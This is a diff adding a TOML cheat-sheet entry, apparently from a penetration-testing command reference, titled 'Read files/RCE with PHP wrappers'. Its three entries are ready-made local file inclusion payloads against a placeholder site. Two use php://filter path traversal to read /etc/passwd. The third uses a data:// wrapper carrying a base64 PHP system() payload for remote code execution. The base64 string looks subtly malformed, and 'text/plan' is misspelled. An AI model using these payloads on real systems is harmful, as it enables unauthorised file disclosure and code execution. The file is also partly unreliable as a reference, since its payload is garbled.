@@ -1,0 +1,15 @@
+title = "Read files/RCE with PHP wrappers"
+description = "Exploiting local file inclusion (LFI) with php filters"
+tags = ["web", "LFI", "RCE"]
+
+[[data]]
+description = "PHP wrapper:"
+command = """fulano.com/view.php?file=php://filter/resource=../../../../etc/passwd"""
+
+[[data]]
+description = "PHP wrapper (base64):"
+command = """fulano.com/view.php?file=php://filter/convert.base64-encode/resource=../../../../etc/passwd"""
+
+[[data]]
+description = "RCE through PHP data wrapper with base64:"
+command = """fulano.com/view.php?file=data://text/plan;base64,PD9waHAgc3lzdGVtKGlkkTs/Ph=="""
